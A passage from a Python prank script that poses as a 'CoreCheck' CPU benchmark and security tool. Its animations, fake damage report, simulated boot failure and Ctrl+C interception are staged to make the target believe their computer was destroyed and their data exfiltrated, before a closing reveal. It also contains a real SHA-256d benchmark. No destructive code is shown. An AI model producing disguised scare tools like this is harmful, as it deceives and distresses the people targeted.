        p = i / (lines - 1)
        name, fn = random.choice(msgs)
        tag, color = ("WARN", BYELLOW) if p < 0.5 else ("FAIL", BRED) if p < 0.85 else ("CRIT", BOLD + BRED)
        say(f"{DIM}[{stamp()}]{RESET} {color}[{tag:^4}]{RESET} {name:<26}{fn(p)}", 0.2 * (1 - p) + 0.02)


def scene_collapse(stage, frames=120):
    palette = [RED, BRED, YELLOW, BYELLOW, BWHITE, BCYAN, BBLUE]
    parts = [[random.uniform(0, math.tau), random.uniform(6, 14) * SCALE] for _ in range(36)]
    for i in range(frames + 1):
        t = i / frames
        radius = (0.8 + 9.2 * (1 - t ** 2.6)) * SCALE
        cv = new_canvas()
        draw_disc(cv, radius, palette[min(int(t * len(palette)), len(palette) - 1)])
        speed = (0.12 + 1.3 * t ** 2) * SCALE
        for p in parts:
            p[1] -= speed
            p[0] += 0.05 + 0.25 * t
            if p[1] < max(radius * 0.7, 0.8):
                p[0], p[1] = random.uniform(0, math.tau), random.uniform(10, 14) * SCALE
            x, y = polar(p[0], p[1])
            put(cv, x, y, random.choice("·.+*"), BYELLOW if t < 0.7 else BWHITE)
        for _ in range(int(t * 14)):
            put(cv, random.randrange(COLS), random.randrange(ROWS), random.choice("·∙*"),
                random.choice([BWHITE, BCYAN, BYELLOW]))
        km = 11.2 * 62000 ** (1 - t ** 2.6)
        dens = 1.4e3 * (4.1e17 / 1.4e3) ** (t ** 1.8)
        if t < 0.55:
            status = f"{BYELLOW}CORE COLLAPSE IN PROGRESS"
        elif t < 0.85:
            status = f"{BRED}ELECTRON DEGENERACY LIMIT EXCEEDED"
        else:
            status = (BOLD + BRED if i % 2 else BWHITE) + "!! CORE BOUNCE IMMINENT !!"
        hud = [
            f"{DIM}radius{RESET} {km:>11,.1f} km   {DIM}density{RESET} {sci(dens)} kg/m³",
            f"{DIM}core T{RESET} {sci(1e7 * 1e4 ** t)} K   {DIM}infall{RESET} {0.25 * t ** 1.5:.3f} c",
            f"{BOLD}{status}{RESET}",
        ]
        stage.show(cv, hud, shake=int(t * 3))
        pause(0.085 - 0.04 * t, 0.1)


def scene_bounce(stage):
    for i in range(10):
        if i < 6:
            ch, col = "█", (BWHITE if i % 2 == 0 else BYELLOW)
        else:
            ch, col = "▓▒░"[min(i - 6, 2)], BYELLOW
        stage.show([[(ch, col)] * COLS for _ in range(ROWS)], ["", f"{BOLD}{BRED}*** CORE BOUNCE ***", ""], shake=5)
        pause(0.07, 0.1)


def scene_shockwave(stage, frames=40):
    for i in range(frames):
        t = i / frames
        r = (1.5 + i * 0.38) * SCALE
        cv = new_canvas()
        for _ in range(40):
            x, y = polar(random.uniform(0, math.tau), random.uniform(0, r))
            put(cv, x, y, random.choice("·.*+"), random.choice([BYELLOW, BRED, YELLOW]))
        for k, color in ((1.0, BYELLOW), (0.72, BRED), (0.45, RED)):
            if r * k > 1.5:
                draw_ring(cv, r * k, 1.1, color)
        draw_disc(cv, 1.6 * SCALE + 0.4, BCYAN, "▒▓█")
        hud = [
            f"{DIM}shock front{RESET} {r / SCALE * 900:>9,.0f} km   {DIM}ejecta{RESET} {0.12 - 0.05 * t:.2f} c",
            f"{DIM}neutrino burst{RESET} {sci(1e58 * min(1.0, t * 2))} particles  {DIM}(~99% of the energy){RESET}",
            f"{BOLD}{BYELLOW}S U P E R N O V A",
        ]
        stage.show(cv, hud, shake=int(4 * (1 - t)))
        pause(0.055, 0.1)


def scene_pulsar(stage, frames=100):
    stars = [(random.randrange(COLS), random.randrange(ROWS)) for _ in range(28)]
    angle = 0.0
    for i in range(frames):
        cv = new_canvas()
        for x, y in stars:
            put(cv, x, y, "·", DIM)
        for k in range(3):
            rr = ((i * 0.35 + k * 4.7) * SCALE) % (14 * SCALE)
            if rr > 2:
                draw_ring(cv, rr, 0.6, DIM + BLUE, "░·")
        for off in (0.0, math.pi):
            for s in range(1, 34):
                x, y = polar(angle + off, s * 0.45 * SCALE)
                put(cv, x, y, "█▓▒░·"[min(s // 7, 4)], BCYAN if s < 20 else CYAN)
        draw_disc(cv, 1.5 * SCALE + 0.3, BWHITE, "▒▓██")
        angle += 0.55
        hud = [
            f"{DIM}spin{RESET} 716 Hz   {DIM}B-field{RESET} 1.0e8 T   {DIM}pulses{RESET} {int(angle / math.pi)}",
            f"{DIM}density{RESET} 4.1e17 kg/m³   {DIM}escape v{RESET} 0.64 c",
            f"{BOLD}{BCYAN}NEUTRON STAR STABLE  -  PSR J1748-2446ad class",
        ]
        stage.show(cv, hud, shake=1 if i % 7 == 0 else 0)
        pause(0.05, 0.1)
    pause(0.4)


def collapse(step):
    section(f"PHASE {step} :: GRAVITATIONAL COLLAPSE")
    log("CRIT", "Final stage: compressing the remains past nuclear density so nothing can be reconstructed.")
    log("WARN", "Electron degeneracy pressure: EXCEEDED")
    log("WARN", "Protons and electrons merging into neutrons ...")
    say()
    gravity_surge()
    log("CRIT", "Infall velocity 0.25c. Point of no return passed.", 0.8)
    say()
    w(HIDE_CURSOR)
    init_canvas()
    stage = Stage()
    scene_collapse(stage)
    scene_bounce(stage)
    scene_shockwave(stage)
    scene_pulsar(stage)
    stage.erase()
    log("CRIT", f"{BOLD}{BWHITE}S U P E R N O V A{RESET}  -  remnant stabilised.", 0.5)
    say()
    say(f"{BOLD}{BCYAN}  DAMAGE REPORT  -  {TARGET}@{platform.node() or 'localhost'}{RESET}", 0.4)
    rows = [
        ("Files deleted", fmt(STATE["deleted"]), BRED),
        ("Files corrupted + key discarded", fmt(STATE["corrupted"]), BRED),
        ("Data exported to remote dropzone", f"{STATE['exported_gb']:.1f} GB "
         f"({fmt(STATE['docs'])} documents, {fmt(STATE['photos'])} photos)", BYELLOW),
        ("Backups destroyed", "3  (snapshots, backup volume, cloud sync)", BRED),
        ("Partition table", "DESTROYED", BRED),
        ("Boot loader / recovery partition", "DESTROYED", BRED),
        ("Firmware / NVRAM", "RESET", BRED),
        ("Recovery probability", "0.0000%", BRED),
        ("Remnant", "1.4 M☉ neutron star, r = 11.2 km, 716 Hz", BWHITE),
        ("One teaspoon of what's left", "≈ 6 billion tonnes", BWHITE),
    ]
    for key, val, color in rows:
        say(f"  {DIM}{key:<36}{RESET}{color}{val}{RESET}", 0.3)
    say()
    say(f"{BOLD}{BYELLOW}  ★  TARGET SUCCESSFULLY CONVERTED INTO A NEUTRON STAR  ★{RESET}", 0.6)
    say(f"{DIM}  Please do not lick it. Please do not teaspoon it.{RESET}", 0.8)
    log("CRIT", f"Connection to {platform.node() or 'target'} lost: host is no longer in the observable universe.", 1.2)
    pause(1.8)


class Keys:
    def __enter__(self):
        self.old = None
        self.live = os.name == "nt" or sys.stdin.isatty()
        if os.name != "nt" and sys.stdin.isatty():
            try:
                import termios
                import tty
                self.fd = sys.stdin.fileno()
                self.old = termios.tcgetattr(self.fd)
                tty.setcbreak(self.fd)  #cbreak keeps ctrl+c working and stops keys echoing
            except Exception:
                self.old = None
                self.live = False
        return self

    def __exit__(self, *a):
        if self.old is not None:
            import termios
            termios.tcsetattr(self.fd, termios.TCSAFLUSH, self.old)  #flush drops key mashing

    def pressed(self):
        if os.name == "nt":
            import msvcrt
            if msvcrt.kbhit():
                msvcrt.getwch()
                return True
            return False
        if self.old is not None and select.select([sys.stdin], [], [], 0)[0]:
            os.read(self.fd, 1024)
            return True
        return False


FOLDER = [
    " ╭──────╮",
    " │      ╰───────────────╮",
    " │                      │",
    " │        ▄████▄        │",
    " │        ▀▀  ██        │",
    " │          ▄██▀        │",
    " │          ██          │",
    " │                      │",
    " │          ██          │",
    " ╰──────────────────────╯",
]


def boot_failure():
    global quiet_int
    quiet_int = True
    cols, rows = shutil.get_terminal_size((80, 24))
    w(CLEAR_SCREEN + HIDE_CURSOR)
    pause(2.0)
    if SYSTEM == "Darwin":
        fw = max(len(l) for l in FOLDER)
        art = [l.ljust(fw) for l in FOLDER]
        top, left = max(1, (rows - len(art)) // 2), max(1, (cols - fw) // 2)

        def draw(on):
            for k, ln in enumerate(art):
                w(f"{ESC}{top + k};{left}H" + (WHITE + ln + RESET if on else " " * fw))
    else:
        msg = "No bootable device -- insert boot disk and press any key"

        def draw(on):
            w(f"{ESC}1;1H{msg}{'_' if on else ' '}")

    min_frames, max_frames = 17, 100
    try:
        with Keys() as keys:
            for i in range(max_frames):
                draw(i % 2 == 0)
                pause(0.3, 0.05)
                hit = keys.pressed()
                if i >= min_frames and (hit or not keys.live):
                    break
    except KeyboardInterrupt:
        pass
    quiet_int = False


def run_secure():
    banner("NEUTRON", "S T A R   P R O T O C O L   v4.2.0",
           "If it's worth hacking, it's worth compressing to nuclear density.")
    recon("1/7")
    exploit("2/7")
    privesc("3/7")
    defences("4/7")
    exfiltrate("5/7")
    destroy("6/7")
    collapse("7/7")
    boot_failure()
    return [
        "[x] No files were deleted, corrupted or encrypted",
        "[x] No partitions, boot loaders or backups were touched",
        "[x] Nothing was exported - not one byte left your computer",
        "[x] Your computer boots fine. Promise.",
    ]


def boxed(lines, width=64, color=BGREEN):
    out = [color + "╔" + "═" * width + "╗" + RESET]
    for text, style in lines:
        out.append(f"{color}║{RESET}{style}{text.center(width)}{RESET}{color}║{RESET}")
    out.append(color + "╚" + "═" * width + "╝" + RESET)
    return out


def reveal(completed, facts):
    w(SHOW_CURSOR + RESET)
    say(CLEAR_SCREEN, 0)
    title = "YOU'VE BEEN PRANKED" if completed else "ABORTED EARLY (COWARD)"
    sender = f"Pranked with love by {SENDER}" if SENDER else "Pranked with love by a friend"
    lines = [("", ""), (title, BOLD + BYELLOW), ("", ""), ("Nothing actually happened. Really.", ""), ("", "")]
    lines += [(f, BGREEN) for f in facts]
    lines += [("", ""), (sender, DIM), ("The whole script is one readable file. Go on, read it.", DIM), ("", "")]
    for ln in boxed(lines):
        say(ln, 0.08)
    say()


def on_sigint(signum, frame):
    global interrupts
    interrupts += 1
    if quiet_int or interrupts >= 3:
        raise KeyboardInterrupt
    if interrupts == 1:
        w(f"\n{BOLD}{BRED}[!] SIGINT intercepted by NeutronNet. Nice try.{RESET}\n")
        w(f"{DIM}    (Ctrl+C 2 more times to quit. It's only a prank.){RESET}\n")
    else:
        w(f"\n{BOLD}{BRED}[!] SIGINT intercepted again. NeutronNet is not amused.{RESET}\n")
        w(f"{DIM}    (one more and you're out.){RESET}\n")


# --- real benchmark (no theatrics) -------------------------------------------------------------
# Genesis block header and its known hash: used to prove the hash loop computes real Bitcoin SHA-256d.
GENESIS_HEADER = bytes.fromhex(
    "0100000000000000000000000000000000000000000000000000000000000000000000003ba3edfd7a7b12b27ac72c3e"
    "67768f617fc81bc3888a51323a9fb8aa4b1e5e4a29ab5f49ffff001d1dac2b7c")
GENESIS_HASH = "000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f"


def sha256d(data):
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()


def hash_nonces(header76, start, count):
    """SHA-256d of header76 + 4-byte nonce for `count` nonces, reusing the midstate of the first
    64 bytes (as real miners do). Returns the last digest so the work can't be optimised away."""
    mid = hashlib.sha256(header76[:64])
    tail = header76[64:]
    sha, pack = hashlib.sha256, struct.Struct("<I").pack
    digest = b""
    for nonce in range(start, start + count):
        h = mid.copy()
        h.update(tail + pack(nonce & 0xFFFFFFFF))
        digest = sha(h.digest()).digest()
    return digest


def verify_hash_loop():
    """Check both the plain and the midstate path against the genesis block's real hash."""
    plain = sha256d(GENESIS_HEADER)[::-1].hex()
    nonce = struct.unpack("<I", GENESIS_HEADER[76:])[0]
    mid = hash_nonces(GENESIS_HEADER[:76], nonce, 1)[::-1].hex()
    return plain == GENESIS_HASH and mid == GENESIS_HASH


def _bench_worker(seconds, barrier, out, idx):
    header76 = os.urandom(76)
    hash_nonces(header76, 0, 2000)  # warm-up
    barrier.wait()                  # all workers start the clock together
    done, nonce, batch = 0, 0, 5000
    t0 = time.perf_counter()
    while True:
        hash_nonces(header76, nonce, batch)
        nonce += batch
        done += batch
        elapsed = time.perf_counter() - t0
        if elapsed >= seconds:
            break
    out.put((idx, done, elapsed))


def bench_run(workers, seconds):
    """Run `workers` processes for ~`seconds`; return (total_hashes, wall_seconds, per-worker rates)."""
    ctx = multiprocessing.get_context("spawn")
    barrier, out = ctx.Barrier(workers), ctx.Queue()
    procs = [ctx.Process(target=_bench_worker, args=(seconds, barrier, out, i)) for i in range(workers)]
    for p in procs:
        p.start()
    results = [out.get() for _ in procs]
    for p in procs:
        p.join()
    rates = [n / el for _, n, el in results]
    return sum(n for _, n, _ in results), max(el for _, _, el in results), rates


def human_rate(hps):
    for unit, div in (("GH/s", 1e9), ("MH/s", 1e6), ("kH/s", 1e3)):
        if hps >= div:
            return f"{hps / div:,.2f} {unit}"
    return f"{hps:,.0f} H/s"


def run_hashrate(seconds, workers):
    cores = os.cpu_count() or 1
    workers = workers or cores
    print(f"corecheck hashrate - real SHA-256d (Bitcoin double-SHA256, 80-byte header) benchmark")
    print(f"python {platform.python_version()} on {platform.system()} {platform.machine()}, {cores} logical cores\n")

    ok = verify_hash_loop()
    print(f"correctness check (genesis block hash): {'PASS' if ok else 'FAIL'}")
    if not ok:
        print("hash loop does not reproduce the genesis block hash; refusing to report numbers.")
        return 1

    print(f"\nsingle core, {seconds:g}s ...")
    _, _, r1 = bench_run(1, seconds)
    single = r1[0]
    print(f"  {human_rate(single)}")
    if workers == 1:
        return 0

    print(f"\n{workers} workers, {seconds:g}s ...")
    total_n, wall, rates = bench_run(workers, seconds)
    total = sum(rates)
    eff = total / (single * workers) * 100
    print(f"  total      {human_rate(total)}   ({total_n:,} hashes in {wall:.2f}s)")
    print(f"  per worker {human_rate(min(rates))} .. {human_rate(max(rates))}")
    print(f"  scaling    {total / single:.2f}x over single core ({eff:.0f}% efficiency)")
    return 0


COMMANDS = {"benchmark": run_benchmark, "secure": run_secure}
QUIT_FACTS = [
    "[x] Nothing was installed, deleted, corrupted or sent anywhere",
    "[x] It was only ever text on a screen",
]


def main():
    global SPEED, TARGET, SENDER
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("--speed", type=float, default=1.0, help="playback speed multiplier (default 1.0)")
    common.add_argument("--target", default="", help="user name shown in the output (default: current user)")
    common.add_argument("--from", dest="sender", default="", help="name shown in the final summary")
    ap = argparse.ArgumentParser(description="CoreCheck: CPU benchmark and security check.")
    sub = ap.add_subparsers(dest="command", metavar="command")
    sub.add_parser("benchmark", parents=[common], help="probe the system and stress-test every CPU core")
    sub.add_parser("secure", parents=[common], help="scan open ports and harden the machine")
    hr = sub.add_parser("hashrate", help="real SHA-256d hash-rate benchmark (single core and all cores)")
    hr.add_argument("--seconds", type=float, default=3.0, help="seconds per phase (default 3)")
    hr.add_argument("--workers", type=int, default=0, help="worker processes (default: all logical cores)")
    args = ap.parse_args()
    if args.command == "hashrate":
        try:
            sys.exit(run_hashrate(max(args.seconds, 0.5), max(args.workers, 0)))
        except KeyboardInterrupt:
            sys.exit(130)
    if args.command not in COMMANDS:
        ap.print_help()
        return

    SPEED = max(args.speed, 0.05)
    SENDER = args.sender
    try:
        TARGET = args.target or getpass.getuser()
    except Exception:
        TARGET = args.target or "user"

    enable_ansi_on_windows()
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass
    signal.signal(signal.SIGINT, on_sigint)

    completed, facts = False, QUIT_FACTS
    try:
        w(HIDE_CURSOR + CLEAR_SCREEN)
        facts = COMMANDS[args.command]()
        completed = True
    except KeyboardInterrupt:
        pass
    finally:
        w(ALT_OFF + SHOW_CURSOR + RESET)
    reveal(completed, facts if completed else QUIT_FACTS)


if __name__ == "__main__":
    main()
